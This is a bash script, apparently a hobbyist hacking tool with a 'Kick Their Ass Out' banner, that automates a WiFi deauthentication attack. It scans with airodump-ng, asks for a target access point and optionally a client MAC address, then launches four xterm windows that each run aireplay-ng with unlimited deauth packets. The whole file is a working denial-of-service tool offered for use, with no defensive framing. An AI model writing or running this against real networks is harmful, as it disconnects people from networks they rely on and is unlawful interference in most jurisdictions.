#!/bin/bash

#REPLACE WITH YOUR WIRELESS INTERFACE
IFACE="wlp3s0"

cleanup() {
    echo -e "\n[!] The Attack has been stopped..."
    for pid in "${XTERM_PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    exit 1
}

GREEN='\033[1;32m'
RESET='\033[0m'

clear
echo -e "${GREEN}"
echo "        (\_/)"
echo "        ( •_•)     [Kick Their Ass Out...]"
echo "       / >💻      "
echo "     //|_|\\\\     "
echo "    ( @Limmmw )"
echo "     \_______/ "
echo "    | Terminal |"
echo "    |   Mode   |"
echo "   /___________\\"
echo ""
echo "🐰: \"I'm in.\""
echo -e "${RESET}"

echo "[*] Activating Scanning mode..."
echo "[*] Running airodump-ng (Press CTRL+C if target is detected)..."
sleep 5
sudo airodump-ng $IFACE

echo
read -p "[?] Enter target BSSID (WiFi AP): " BSSID
read -p "[?] Enter channel (CH): " CH

echo
echo "[1] Single Target"
echo "[2] All Clients"
read -p "[?] Choose attack mode (1/2): " MODE

if [ "$MODE" == "1" ]; then
    read -p "[?] Enter client MAC address: " CLIENT
fi

echo "[*] Setting channel to $CH..."
sudo iwconfig $IFACE channel $CH
sleep 1

if [ "$MODE" == "1" ]; then
    DEAUTH_CMD="tput setaf 1; echo '[*] Deauthing client $CLIENT on BSSID $BSSID'; sudo aireplay-ng --deauth 0 -a $BSSID -c $CLIENT $IFACE"
else
    DEAUTH_CMD="tput setaf 1; echo '[*] Deauthing all clients on BSSID $BSSID'; sudo aireplay-ng --deauth 0 -a $BSSID $IFACE"
fi

launch_xterm_at() {
    local GEOMETRY=$1
    xterm -geometry "$GEOMETRY" -fg red -fa 'Monospace' -fs 10 -e bash -c "$DEAUTH_CMD" &
    XTERM_PIDS+=($!)
}

XTERM_PIDS=()
echo "[*] Launching Deauther Attack..."

launch_xterm_at "80x24+0+0"; sleep 0.5
launch_xterm_at "80x24+0-0"; sleep 0.5
launch_xterm_at "80x24-0+0"; sleep 0.5
launch_xterm_at "80x24-0-0"

echo
read -p "[!] Press Enter to stop the Attacks..." _

cleanup
